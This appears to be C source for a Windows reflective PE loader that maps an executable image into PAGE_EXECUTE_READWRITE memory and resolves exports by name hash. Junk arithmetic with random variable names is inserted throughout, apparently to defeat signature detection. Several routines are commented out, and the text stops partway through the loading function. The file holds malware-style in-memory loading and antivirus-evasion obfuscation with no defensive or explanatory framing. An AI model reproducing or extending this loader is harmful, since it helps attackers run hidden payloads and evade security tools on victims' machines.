#include "pe.h"
#include <stdio.h>
#include <Shlwapi.h>
#include <imagehlp.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Imagehlp.lib")

#ifdef _WIN64
#define POINTER_TYPE unsigned long long
#else
#define POINTER_TYPE unsigned long
#endif

typedef LPVOID(WINAPI *funcVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI *funcVirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
typedef HMODULE(WINAPI *funcLoadLibraryA)(LPCSTR lpLibFileName);
typedef FARPROC(WINAPI *funcGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef void*(__cdecl *funcmemcpy)(void *dest, const void *src, size_t count);

unsigned int NameHash(const char *szName)
{
	unsigned int ret = 0;
	for (int i = 0; szName[i] != 0; ++i)
	{
		//kernel32: ret * 3 + (szName[i] / 16) + (szName[i] % 16) * 16 + i;
		ret = ret * 3 + (szName[i] / 16) + (szName[i] % 16) * 16 + i;
	}

	return ret;
}


/*bool DoBaseReloc(unsigned char *codeBase, size_t codeSize, size_t delta, IMAGE_BASE_RELOCATION *pBaseReloc, int remainSize)
{
	bool ret = true;
	while (remainSize > 0 && ret)
	{
		WORD *arrRel = (WORD *)&pBaseReloc[1];
		int nRel = (pBaseReloc[0].SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
int iZzTP03N67I = 0x8233c59;
int iJKTYPrKDiP = 0x0c384db;
int i1NOqkTPtvW = 0x8622bab;
int iN3RUg8OTPH = i1NOqkTPtvW * iJKTYPrKDiP + iZzTP03N67I;
iJKTYPrKDiP = 0x50e5595 + iN3RUg8OTPH + 0xaff8205 + iZzTP03N67I;
int i1GVNwXFUbs = iZzTP03N67I / 0x0c384db - i1NOqkTPtvW ^ i1NOqkTPtvW ^ 0x8622bab;

		char *dest = (char*)codeBase + pBaseReloc[0].VirtualAddress;

		if (dest < (char*)codeBase || (char*)codeBase + codeSize < dest)
		{
			ret = false;
		}
		else for (int i = 0; i < nRel; ++i)
		{
			DWORD *patchAddrHL;
#ifdef _WIN64
			ULONGLONG *patchAddr64;
#endif
			int offset = arrRel[i] & 0xfff;
			switch (arrRel[i] >> 12)
			{
			case IMAGE_REL_BASED_ABSOLUTE:
				// skip relocation
				break;

			case IMAGE_REL_BASED_HIGHLOW:
				// change complete 32 bit address
				patchAddrHL = (DWORD *)(dest + offset);
				*patchAddrHL += (DWORD)delta;
				break;

#ifdef _WIN64
			case IMAGE_REL_BASED_DIR64:
				patchAddr64 = (ULONGLONG *)(dest + offset);
				*patchAddr64 += delta;
				break;
#endif

			default:
				ret = false;
				break;
			}
		}

		if (ret)
		{
			remainSize -= pBaseReloc[0].SizeOfBlock;
			pBaseReloc = (IMAGE_BASE_RELOCATION *)((char*)pBaseReloc + pBaseReloc[0].SizeOfBlock);
		}
	}

	return ret;

}*/

/*bool DoImport(unsigned char *codeBase, IMAGE_IMPORT_DESCRIPTOR *pImportDesc, funcLoadLibraryA fnLoadLibraryA, funcGetProcAddress fnGetProcAddress)
{
	bool ret = true;

	while (pImportDesc[0].Name)
	{
		char *szLibName = (char*)codeBase + pImportDesc[0].Name;
int iO0tUHUkscT;
int itLIVWfUgi3 = 0xa8dd8ea;
int i1MG7A0HrXs = 0xe2521ff;
int iGdHxBsANVA = 0x3451085;
for(iO0tUHUkscT = 0; iO0tUHUkscT < 3; iO0tUHUkscT++)
{
    itLIVWfUgi3 = iO0tUHUkscT * 99 - 1000 * i1MG7A0HrXs + 0x456 ^ 0x1770067 % 5 - 0xe21b1ce;
    i1MG7A0HrXs = iO0tUHUkscT * 3 + iGdHxBsANVA + 0x30 + 0x3451085 % 123 - i1MG7A0HrXs;
    iGdHxBsANVA = iO0tUHUkscT * 4 - 0xe2521ff + 0xff / 0x123 - 0x3451085 % 234 - 0xe21b1ce;
}
int iw2MYtMwY6A = iGdHxBsANVA - itLIVWfUgi3 * i1MG7A0HrXs + 0x3451085;
iw2MYtMwY6A = iO0tUHUkscT - 50 + 100 - 0xe2521ff ^ 99 * 0x0f - 0x3451085 % 2 - 3575 + 0xe21b1ce;


		HMODULE hLib = fnLoadLibraryA(szLibName);
int i1Y98O3Ex3h = 0x8e0a56f;
int icLdIaFRfDZ = 0xed8f5de;
int iUJZCBhgLdH = 0xafe42bc;
int i8LqoM6TqRN = i1Y98O3Ex3h + icLdIaFRfDZ - iUJZCBhgLdH;
i8LqoM6TqRN = 0x2b9a5d6 * i8LqoM6TqRN + 0xb56f223 - icLdIaFRfDZ;
int iGuNaigupon = i8LqoM6TqRN / 0xb56f223 + i1Y98O3Ex3h ^ iUJZCBhgLdH - 0xafe42bc;


		if (!hLib)
		{
			ret = false;
			break;
int iz6dvlNzTj5 = 0xbe59995;
int i9eex0hzoGq = 0xf8f63e1;
int ijYe8Wtk0Na = iz6dvlNzTj5 - i9eex0hzoGq;

		}

		POINTER_TYPE *thunkRef;
		FARPROC *funcRef;
		if (pImportDesc[0].OriginalFirstThunk) {
			thunkRef = (POINTER_TYPE *)(codeBase + pImportDesc[0].OriginalFirstThunk);
			funcRef = (FARPROC *)(codeBase + pImportDesc[0].FirstThunk);
		}
		else {
			// no hint table
			thunkRef = (POINTER_TYPE *)(codeBase + pImportDesc[0].FirstThunk);
			funcRef = (FARPROC *)(codeBase + pImportDesc[0].FirstThunk);
		}

		if (!thunkRef || !funcRef)
		{
			ret = false;
			break;
		}
		else for (; *thunkRef; thunkRef++, funcRef++)
		{
			if (IMAGE_SNAP_BY_ORDINAL(*thunkRef))
			{
				*funcRef = fnGetProcAddress(hLib, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
			}
			else
			{
				PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + (*thunkRef));
int ir83RqU15TY = 0x5691182;
int isGeRpcAAps = 0xf1c1380;
int ihS1R9BY8gW = 0x120749b;
int i9iKsuhgj6p = ir83RqU15TY + isGeRpcAAps - ihS1R9BY8gW;
i9iKsuhgj6p = 0xc1cd18b * i9iKsuhgj6p + 0xf961a65 - isGeRpcAAps;
int iONJteWX0rg = i9iKsuhgj6p / 0xf961a65 + ir83RqU15TY ^ ihS1R9BY8gW - 0x120749b;


				*funcRef = fnGetProcAddress(hLib, (LPCSTR)&thunkData->Name);
			}

			if (*funcRef == 0) {
				ret = false;
				break;
			}
		}

		pImportDesc++;
	}

	return ret;
}*/

FARPROC DoGetProcAddress(unsigned char *codeBase, PIMAGE_EXPORT_DIRECTORY pExport, unsigned int hName)
{
	void* ret = nullptr;

	WORD *pwExportOrd = (WORD*)(codeBase + pExport->AddressOfNameOrdinals);
	DWORD *pdwExportAddr = (DWORD*)(codeBase + pExport->AddressOfFunctions);
	DWORD *pdwExportName = (DWORD*)(codeBase + pExport->AddressOfNames);

	DWORD i, n = pExport->NumberOfNames;
	for (i = 0; i < n; ++i)
	{
		const char *pszExpFuncName = (char*)codeBase + pdwExportName[i];
		if (NameHash(pszExpFuncName) == hName)
		{
			ret = codeBase + pdwExportAddr[pwExportOrd[i]];
			break;
		}
	}

	return (FARPROC)ret;
}

bool PECheck(const void *pImg, int sztImg)
{
	bool ret = false;
	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)pImg;
	IMAGE_NT_HEADERS *pNT = (IMAGE_NT_HEADERS*)((char*)pImg + pDos->e_lfanew);

	WORD wMagic =
#ifndef _WIN64
		IMAGE_NT_OPTIONAL_HDR32_MAGIC;
#else
		IMAGE_NT_OPTIONAL_HDR64_MAGIC;
#endif

	WORD wMachine =
#ifndef _WIN64
		IMAGE_FILE_MACHINE_I386;
#else
		IMAGE_FILE_MACHINE_AMD64;
#endif
	if ((ULONG)pDos->e_lfanew + pNT->FileHeader.SizeOfOptionalHeader >= (ULONG)sztImg)
	{
		printf("Invalid PE Header size");
	}
	if (pNT->Signature != IMAGE_NT_SIGNATURE)
	{
		printf("Invalid PE Signature");
	}
	else if (pNT->OptionalHeader.Magic != wMagic
		|| pNT->FileHeader.Machine != wMachine)
	{
		printf("Invalid PE Machine");
	}
	else if (pNT->FileHeader.NumberOfSections >= 90)
	{
		printf("Number of PE Section %d >= %d", pNT->FileHeader.NumberOfSections, 90);
	}
	else if (pNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size == 0)
	{
		printf("Not support image with no relocation yet!");
	}
	else
	{
		ret = true;
	}

	return ret;

}

/*HMODULE FixIntoMem(const void *pImg, int sztImg, funcVirtualAlloc fnVirtualAlloc, funcVirtualFree fnVirtualFree, funcmemcpy fnmemcpy)
{
	HMODULE hMod = nullptr;

	const IMAGE_DOS_HEADER *pDos = (const IMAGE_DOS_HEADER*)pImg;
	char *pChOldDos = (char*)pDos;

	IMAGE_NT_HEADERS *pOldNTHead = (IMAGE_NT_HEADERS*)((char*)pImg + pDos->e_lfanew);
	DWORD dwFullNTSize = sizeof(IMAGE_NT_HEADERS) - (sizeof(IMAGE_OPTIONAL_HEADER) - pOldNTHead->FileHeader.SizeOfOptionalHeader);
	IMAGE_SECTION_HEADER *pOldSectHead = (IMAGE_SECTION_HEADER*)((char*)pOldNTHead + dwFullNTSize);

	if (pOldNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0
		&& (pOldNTHead->FileHeader.Characteristics&IMAGE_FILE_RELOCS_STRIPPED)
		)
	{
		hMod = (HMODULE)pOldNTHead->OptionalHeader.ImageBase;
	}

	hMod = (HMODULE)fnVirtualAlloc(hMod, pOldNTHead->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (hMod == nullptr)
	{
		//printf("Can't alloc memory: %d at %p", pOldNTHead->OptionalHeader.SizeOfImage, hMod);
	}
	else
	{
		IMAGE_DOS_HEADER *pNewDos = (IMAGE_DOS_HEADER*)hMod;
		char *pChNewDos = (char*)hMod;

		DWORD dwStubSize = dwFullNTSize + sizeof(IMAGE_SECTION_HEADER)*pOldNTHead->FileHeader.NumberOfSections;
		//copy dos
		fnmemcpy(pChNewDos, pChOldDos, pDos->e_lfanew);

		IMAGE_NT_HEADERS *pNewNtHead = (IMAGE_NT_HEADERS*)(pChNewDos + pDos->e_lfanew);
		//copy NT head & section header
		fnmemcpy(pNewNtHead, pOldNTHead, dwStubSize);

		//fix all section 
		int iSectionIndex = 0;

		for (iSectionIndex = 0;
			iSectionIndex < pOldNTHead->FileHeader.NumberOfSections;
			++iSectionIndex)
		{
			char *pNewSectData = pChNewDos + pOldSectHead[iSectionIndex].VirtualAddress;
			char *pOldSectData = pChOldDos + pOldSectHead[iSectionIndex].PointerToRawData;

			//check for valid section data
			if (pOldSectHead[iSectionIndex].SizeOfRawData
				&& pOldSectHead[iSectionIndex].PointerToRawData + pOldSectHead[iSectionIndex].SizeOfRawData > (ULONG)sztImg)
			{
				break;
			}

			DWORD dwRVASize = Align(pOldSectHead[iSectionIndex].Misc.VirtualSize, pOldNTHead->OptionalHeader.SectionAlignment);
			fnmemcpy(pNewSectData, pOldSectData, pOldSectHead[iSectionIndex].SizeOfRawData);
		}

		if (iSectionIndex == pOldNTHead->FileHeader.NumberOfSections)
		{
		}
		else
		{
			fnVirtualFree(hMod, 0, MEM_RELEASE); hMod = nullptr;
		}
	}

	return (HMODULE)hMod;
}*/

/*bool Reloc(HMODULE hMod)
{
	bool ret = false;

	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
	unsigned char *pBase = (unsigned char*)pDos;

	IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)((char*)pDos + pDos->e_lfanew);
	IMAGE_DATA_DIRECTORY imgDirRelocation = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	unsigned char *pOrgBase = (unsigned char*)pNTHead->OptionalHeader.ImageBase;
	if (pOrgBase == pBase)
	{
		ret = true;
	}
	else if (imgDirRelocation.VirtualAddress == 0)
	{
		ret = false;
	}
	else
	{
		size_t delta = pBase - pOrgBase;

		IMAGE_BASE_RELOCATION *pBaseReloc = (IMAGE_BASE_RELOCATION*)(pBase + imgDirRelocation.VirtualAddress);

		if (imgDirRelocation.VirtualAddress + imgDirRelocation.Size >= pNTHead->OptionalHeader.SizeOfImage)
		{
			ret = false;
		}
		else
		{
			ret = DoBaseReloc(pBase, pNTHead->OptionalHeader.SizeOfImage, delta, pBaseReloc, imgDirRelocation.Size);
		}
	}

	return ret;
}*/

/*bool Import(HMODULE hMod, funcLoadLibraryA fnLoadLibraryA, funcGetProcAddress fnGetProcAddress)
{
	bool ret = true;

	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
	unsigned char *pBase = (unsigned char*)hMod;

	IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)(pBase + pDos->e_lfanew);
	IMAGE_DATA_DIRECTORY imgDirImport = pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];


	if (imgDirImport.VirtualAddress)
	{
		IMAGE_IMPORT_DESCRIPTOR *pImportDesc = (IMAGE_IMPORT_DESCRIPTOR*)(pBase + imgDirImport.VirtualAddress);
		if (imgDirImport.VirtualAddress + imgDirImport.Size >= pNTHead->OptionalHeader.SizeOfImage)
		{
			ret = false;
int i2hKkHbTSIW = 0xc5ac6dc;
int icAK59GtHRg = 0x2971dad;
int iDN7hk3ZIHX = 0x50ec725;
int iGmoDx2GisG = iDN7hk3ZIHX * icAK59GtHRg + i2hKkHbTSIW;
icAK59GtHRg = 0x071f30c - iGmoDx2GisG + 5 + 0xb1b3df5 + 69 - i2hKkHbTSIW;
i2hKkHbTSIW = 0xc5ac6dc + 10 - icAK59GtHRg % 10 + 0x50ec725 + 999 - iGmoDx2GisG;
iGmoDx2GisG = i2hKkHbTSIW % 5 + iDN7hk3ZIHX % 0x2971dad + 0xcafebabe + i2hKkHbTSIW;
iDN7hk3ZIHX = 0xc5ac6dc * 0x100 - i2hKkHbTSIW + 56 ^ 0x2971dad + 1996 - iDN7hk3ZIHX;
int iYyVsJNLwYt = iDN7hk3ZIHX / 77 + 0x50ec725 - 76 / iDN7hk3ZIHX ^ 0x33 % iDN7hk3ZIHX % 0x50ec725;
iYyVsJNLwYt = 0xb1b3df5 * 0x10 - 22 + iYyVsJNLwYt + 56 ^ 0xff + icAK59GtHRg + 1996 - 2111 + iDN7hk3ZIHX;

		}
		else
		{
			ret = DoImport(pBase, pImportDesc, fnLoadLibraryA, fnGetProcAddress);
		}
	}

	return ret;
}*/

/*bool ExecuteTLS(HMODULE hMod)
{
	unsigned char *codeBase = (unsigned char *)hMod;
	PIMAGE_TLS_DIRECTORY tls;
	PIMAGE_TLS_CALLBACK* callback;

	IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)codeBase;
	IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)(codeBase + pDos->e_lfanew);
	PIMAGE_DATA_DIRECTORY directory = &pNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	if (directory->VirtualAddress == 0) {
		return true;
	}

	tls = (PIMAGE_TLS_DIRECTORY)(codeBase + directory->VirtualAddress);
	callback = (PIMAGE_TLS_CALLBACK *)tls->AddressOfCallBacks;
int i2OYWrmuYp1 = 0xc6e7fbc;
int iSw6IRdieFN = 0xb9c0ccd;
int inkcT0FpQth = i2OYWrmuYp1 + iSw6IRdieFN;

	if (callback) {
		while (*callback) {
			(*callback)((LPVOID)codeBase, DLL_PROCESS_ATTACH, NULL);
			callback++;
		}
	}
	return true;
}*/

void Release(HMODULE hMod)
{
	if (hMod != nullptr)
	{
		IMAGE_DOS_HEADER *pDos = (IMAGE_DOS_HEADER*)hMod;
		IMAGE_NT_HEADERS *pNTHead = (IMAGE_NT_HEADERS*)((char*)hMod + pDos->e_lfanew);
int i7qx1eEwQ5p = 0x42006b0;
int iaN64EzRekK = 0x23c9723;
int iH4b5H7WYhE = 0x8b83e6b;
int in5Rp7ZGtxr = 0x23914ba;
int iRPqREbLHEN = 0;
switch(iRPqREbLHEN)
{
    case 0:
        i7qx1eEwQ5p = iaN64EzRekK - 0xcabf8d8 * iH4b5H7WYhE / 100;
        iaN64EzRekK = 0x8b83e6b - 5 +  0x8b83e6b - 6 * iaN64EzRekK / 10 + 25;
        iH4b5H7WYhE = i7qx1eEwQ5p * 0x12 + in5Rp7ZGtxr * 0x15 + 0x23914ba / 13 + 0xcabf8d8 + 555;
        in5Rp7ZGtxr = 0x42006b0 - 21 + 11 * 1996 - iaN64EzRekK + 14520538 - iH4b5H7WYhE - 14520692 + 0x23c9723 - 97;
        break;
    case 1:
        i7qx1eEwQ5p = iaN64EzRekK - 25 + 0x42006b0 - 40 + 0x8b83e6b % 10 + 2;
        iH4b5H7WYhE = iH4b5H7WYhE - 0xff % 3 - in5Rp7ZGtxr * 10 + 0xcabf8d8 / 2 - 10 + 0x23c9723 - 5;
        in5Rp7ZGtxr = 0x42006b0 % 0xcabf8d8 ^ 33 + 0x8b83e6b * 0x12 - 30 + 0x8b83e6b + 23;
        iaN64EzRekK = iaN64EzRekK + 321 + iH4b5H7WYhE * 10 * iaN64EzRekK / 10 / 2 + 0xcabf8d8 * 0x60;
        break;
    case 2:
        i7qx1eEwQ5p = iaN64EzRekK - 45 - iH4b5H7WYhE * 46 + 0x42006b0 / 0xdade;
        iaN64EzRekK = iaN64EzRekK + 0xcabf8d8 - iH4b5H7WYhE * 0x23c9723 - 3;
        iH4b5H7WYhE = 0x23c9723 - 0x1 + i7qx1eEwQ5p * 0x2 - 0xcabf8d8 / 0x3 + 0x8b83e6b;
        in5Rp7ZGtxr = i7qx1eEwQ5p - 0x4 * 0x42006b0 + 0x1234 - 0x4567 + 0xcafe + iaN64EzRekK % 0x432 / 0x23914ba - 0x23;
        break;
    case 3:
        iaN64EzRekK = in5Rp7ZGtxr * 2 * 0x23c9723 - 4 + 0xcabf8d8 + 12 + 34 + 0x42006b0;
        iH4b5H7WYhE = iaN64EzRekK - 43 + 0x8b83e6b * 3040 - 0x23c9723 % 10 + 1 - 0x8b83e6b;
        in5Rp7ZGtxr = 0x8b83e6b - 33 + i7qx1eEwQ5p * 0x25 + 0x42006b0 - 3004 + 0x23c9723;
        i7qx1eEwQ5p = 0x42006b0 + 2905 % iaN64EzRekK * 1996 + 0x23914ba - 70 * 0xcabf8d8;
        break;
    case 4:
        in5Rp7ZGtxr = iaN64EzRekK - 36 +0xcabf8d8 * 2001 - iH4b5H7WYhE / 234 + 0x7;
        i7qx1eEwQ5p = in5Rp7ZGtxr - 0xabcedf + 0x23c9723 * 0xa2bc5 + in5Rp7ZGtxr / 0x123 + 0x42006b0;
        iH4b5H7WYhE = i7qx1eEwQ5p - 0x124 + 23 / iaN64EzRekK / 3 / 2 + iH4b5H7WYhE + 29 - 0x23c9723 + 100;
        iaN64EzRekK = 0x23c9723 - 70 + 70  + 0x42006b0 / 2 + 423 - 0x42006b0 / 7749 % 0x1234;
        break;
    case 5:
        iaN64EzRekK = iaN64EzRekK - 9981 % i7qx1eEwQ5p + 111 - iH4b5H7WYhE / 224 % 0x8b83e6b;
        iH4b5H7WYhE = iH4b5H7WYhE - 339 - iH4b5H7WYhE * 4416 / 0xcabf8d8 + 5525 + 0x23c9723 % 10;
        in5Rp7ZGtxr = in5Rp7ZGtxr - 6636 + 0x23c9723 * 7749 + 1 - iaN64EzRekK * 8864 / 0xfecba;
        i7qx1eEwQ5p = 0xcabf8d8 - 9981 % 0x42006b0 % 10 % 1010100 - 0x42006b0 - 23 -  0xcabf8d8 - 2500;
        break;
}
iRPqREbLHEN = in5Rp7ZGtxr - 0xaa + 0x8b83e6b * 46 - 15 / iH4b5H7WYhE + 11 - 0x42006b0;
iRPqREbLHEN = iRPqREbLHEN - 70 * 55 - iH4b5H7WYhE ^ 0x99 - 0x567498 % 0x42006b0 % 2 - 234 + 0x23c9723;


		char *pEntry = (char*)hMod + pNTHead->OptionalHeader.AddressOfEntryPoint;

		if ((pNTHead->FileHeader.Characteristics&IMAGE_FILE_DLL) == IMAGE_FILE_DLL)
		{
			bool(WINAPI *iDllMain)(void*, unsigned int, void*);
			*(char **)&iDllMain = pEntry;

			//printf("Call DllMain");
			iDllMain(hMod, DLL_PROCESS_DETACH, 0);
		}

		VirtualFree(hMod, 0, MEM_RELEASE);
	}
}

HMODULE Load(LPVOID Param)
{
	PE *sPe = (PE*)Param;

	funcVirtualAlloc fnVirtualAlloc = (funcVirtualAlloc)sPe->fnVirtualAlloc;
	funcVirtualFree fnVirtualFree = (funcVirtualFree)sPe->fnVirtualFree;
	funcLoadLibraryA fnLoadLibraryA = (funcLoadLibraryA)sPe->fnLoadLibraryA;
int izPjf5KZeQJ = 0x57a18e9;
int iaM5xFADucD = 0x4525888;
int iYjP3tYBedh = 0xdc746df;
int ia27WZ3RK1D = izPjf5KZeQJ + iaM5xFADucD - iYjP3tYBedh;
ia27WZ3RK1D = 0xfe63d78 * ia27WZ3RK1D + 0xcdaea82 - iaM5xFADucD;
int i4zBmKA6HEO = ia27WZ3RK1D / 0xcdaea82 + izPjf5KZeQJ ^ iYjP3tYBedh - 0xdc746df;

	funcGetProcAddress fnGetProcAddress = (funcGetProcAddress)sPe->fnGetProcAddress;
	funcmemcpy fnmemcpy = (funcmemcpy)sPe->fnmemcpy;

	HMODULE hMod = nullptr;
int iJ2mYU49xS4 = 0xbea462c;
int imvWs1fEmJt = 0x8a552d3;
int iirY6DEOdwI = 0x0d5880c;
int iyNIVPUGdid = 0x3235518;
int iIvQsG7FMju = 2;
switch(iIvQsG7FMju)
{
    case 0:
        iJ2mYU49xS4 = imvWs1fEmJt - 0x0d38fbd * iirY6DEOdwI / 100;
        imvWs1fEmJt = 0x0d5880c - 5 +  0x0d5880c - 6 * imvWs1fEmJt / 10 + 25;
        iirY6DEOdwI = iJ2mYU49xS4 * 0x12 + iyNIVPUGdid * 0x15 + 0x3235518 / 13 + 0x0d38fbd + 555;
        iyNIVPUGdid = 0xbea462c - 21 + 11 * 1996 - imvWs1fEmJt + 14520538 - iirY6DEOdwI - 14520692 + 0x8a552d3 - 97;
        break;
    case 1:
        iJ2mYU49xS4 = imvWs1fEmJt - 25 + 0xbea462c - 40 + 0x0d5880c % 10 + 2;
        iirY6DEOdwI = iirY6DEOdwI - 0xff % 3 - iyNIVPUGdid * 10 + 0x0d38fbd / 2 - 10 + 0x8a552d3 - 5;
        iyNIVPUGdid = 0xbea462c % 0x0d38fbd ^ 33 + 0x0d5880c * 0x12 - 30 + 0x0d5880c + 23;
        imvWs1fEmJt = imvWs1fEmJt + 321 + iirY6DEOdwI * 10 * imvWs1fEmJt / 10 / 2 + 0x0d38fbd * 0x60;
        break;
    case 2:
        iJ2mYU49xS4 = imvWs1fEmJt - 45 - iirY6DEOdwI * 46 + 0xbea462c / 0xdade;
        imvWs1fEmJt = imvWs1fEmJt + 0x0d38fbd - iirY6DEOdwI * 0x8a552d3 - 3;
        iirY6DEOdwI = 0x8a552d3 - 0x1 + iJ2mYU49xS4 * 0x2 - 0x0d38fbd / 0x3 + 0x0d5880c;
        iyNIVPUGdid = iJ2mYU49xS4 - 0x4 * 0xbea462c + 0x1234 - 0x4567 + 0xcafe + imvWs1fEmJt % 0x432 / 0x3235518 - 0x23;
        break;
    case 3:
        imvWs1fEmJt = iyNIVPUGdid * 2 * 0x8a552d3 - 4 + 0x0d38fbd + 12 + 34 + 0xbea462c;
        iirY6DEOdwI = imvWs1fEmJt - 43 + 0x0d5880c * 3040 - 0x8a552d3 % 10 + 1 - 0x0d5880c;
        iyNIVPUGdid = 0x0d5880c - 33 + iJ2mYU49xS4 * 0x25 + 0xbea462c - 3004 + 0x8a552d3;
        iJ2mYU49xS4 = 0xbea462c + 2905 % imvWs1fEmJt * 1996 + 0x3235518 - 70 * 0x0d38fbd;
        break;
    case 4:
        iyNIVPUGdid = imvWs1fEmJt - 36 +0x0d38fbd * 2001 - iirY6DEOdwI / 234 + 0x7;
        iJ2mYU49xS4 = iyNIVPUGdid - 0xabcedf + 0x8a552d3 * 0xa2bc5 + iyNIVPUGdid / 0x123 + 0xbea462c;
        iirY6DEOdwI = iJ2mYU49xS4 - 0x124 + 23 / imvWs1fEmJt / 3 / 2 + iirY6DEOdwI + 29 - 0x8a552d3 + 100;
        imvWs1fEmJt = 0x8a552d3 - 70 + 70  + 0xbea462c / 2 + 423 - 0xbea462c / 7749 % 0x1234;
        break;
    case 5:
        imvWs1fEmJt = imvWs1fEmJt - 9981 % iJ2mYU49xS4 + 111 - iirY6DEOdwI / 224 % 0x0d5880c;
        iirY6DEOdwI = iirY6DEOdwI - 339 - iirY6DEOdwI * 4416 / 0x0d38fbd + 5525 + 0x8a552d3 % 10;
        iyNIVPUGdid = iyNIVPUGdid - 6636 + 0x8a552d3 * 7749 + 1 - imvWs1fEmJt * 8864 / 0xfecba;
        iJ2mYU49xS4 = 0x0d38fbd - 9981 % 0xbea462c % 10 % 1010100 - 0xbea462c - 23 -  0x0d38fbd - 2500;
        break;
}
iIvQsG7FMju = iyNIVPUGdid - 0xaa + 0x0d5880c * 46 - 15 / iirY6DEOdwI + 11 - 0xbea462c;
iIvQsG7FMju = iIvQsG7FMju - 70 * 55 - iirY6DEOdwI ^ 0x99 - 0x567498 % 0xbea462c % 2 - 234 + 0x8a552d3;


	const IMAGE_DOS_HEADER *pDos = (const IMAGE_DOS_HEADER*)sPe->buf;
int ipxzbISxmtG = 0xf4114fe;
int imsUEsCV4Nf = 0x42acb04;
int iw39yzPQnl9 = 0xa1203b4;
int ifkW2Wpr6cv = iw39yzPQnl9 * imsUEsCV4Nf + ipxzbISxmtG;
imsUEsCV4Nf = 0xa8a42a6 - ifkW2Wpr6cv + 5 + 0x36147b9 + 69 - ipxzbISxmtG;
ipxzbISxmtG = 0xf4114fe + 10 - imsUEsCV4Nf % 10 + 0xa1203b4 + 999 - ifkW2Wpr6cv;
ifkW2Wpr6cv = ipxzbISxmtG % 5 + iw39yzPQnl9 % 0x42acb04 + 0xcafebabe + ipxzbISxmtG;
iw39yzPQnl9 = 0xf4114fe * 0x100 - ipxzbISxmtG + 56 ^ 0x42acb04 + 1996 - iw39yzPQnl9;
int i17CUEHv4T1 = iw39yzPQnl9 / 77 + 0xa1203b4 - 76 / iw39yzPQnl9 ^ 0x33 % iw39yzPQnl9 % 0xa1203b4;
i17CUEHv4T1 = 0x36147b9 * 0x10 - 22 + i17CUEHv4T1 + 56 ^ 0xff + imsUEsCV4Nf + 1996 - 2111 + iw39yzPQnl9;

	char *pChOldDos = (char*)pDos;

	IMAGE_NT_HEADERS *pOldNTHead = (IMAGE_NT_HEADERS*)((char*)sPe->buf + pDos->e_lfanew);
	DWORD dwFullNTSize = sizeof(IMAGE_NT_HEADERS) - (sizeof(IMAGE_OPTIONAL_HEADER) - pOldNTHead->FileHeader.SizeOfOptionalHeader);
	IMAGE_SECTION_HEADER *pOldSectHead = (IMAGE_SECTION_HEADER*)((char*)pOldNTHead + dwFullNTSize);

	if (pOldNTHead->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0
		&& (pOldNTHead->FileHeader.Characteristics&IMAGE_FILE_RELOCS_STRIPPED)
		)
	{
		hMod = (HMODULE)pOldNTHead->OptionalHeader.ImageBase;
	}

	hMod = (HMODULE)fnVirtualAlloc(hMod, pOldNTHead->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (hMod == nullptr)
	{
		//printf("Can't alloc memory: %d at %p", pOldNTHead->OptionalHeader.SizeOfImage, hMod);
	}
	else
	{
		IMAGE_DOS_HEADER *pNewDos = (IMAGE_DOS_HEADER*)hMod;
		char *pChNewDos = (char*)hMod;

		DWORD dwStubSize = dwFullNTSize + sizeof(IMAGE_SECTION_HEADER)*pOldNTHead->FileHeader.NumberOfSections;
		//copy dos
		fnmemcpy(pChNewDos, pChOldDos, pDos->e_lfanew);

		IMAGE_NT_HEADERS *pNewNtHead = (IMAGE_NT_HEADERS*)(pChNewDos + pDos->e_lfanew);
		//copy NT head & section header
		fnmemcpy(pNewNtHead, pOldNTHead, dwStubSize);

		//fix all section 
		int iSectionIndex = 0;

		for (iSectionIndex = 0;
			iSectionIndex < pOldNTHead->FileHeader.NumberOfSections;
			++iSectionIndex)
		{
			char *pNewSectData = pChNewDos + pOldSectHead[iSectionIndex].VirtualAddress;
int iTMPgRR02J5 = 0xf15af01;
int iIR5Xp0Qbzu = 0x1477455;
int iehHMpF1r61 = 0x1ff5e6e;
int ih5s4KJDNBe = iTMPgRR02J5 + iIR5Xp0Qbzu - iehHMpF1r61;
ih5s4KJDNBe = 0x78374f3 * ih5s4KJDNBe + 0x559e5a6 - iIR5Xp0Qbzu;
int ia8upsXYMF1 = ih5s4KJDNBe / 0x559e5a6 + iTMPgRR02J5 ^ iehHMpF1r61 - 0x1ff5e6e;

			char *pOldSectData = pChOldDos + pOldSectHead[iSectionIndex].PointerToRawData;

			//check for valid section data
			if (pOldSectHead[iSectionIndex].SizeOfRawData
				&& pOldSectHead[iSectionIndex].PointerToRawData + pOldSectHead[iSectionIndex].SizeOfRawData > (ULONG)sPe->size)
			{
				break;
			}

			DWORD dwRVASize = Align(pOldSectHead[iSectionIndex].Misc.VirtualSize, pOldNTHead->OptionalHeader.SectionAlignment);
			fnmemcpy(pNewSectData, pOldSectData, pOldSectHead[iSectionIndex].SizeOfRawData);
		}

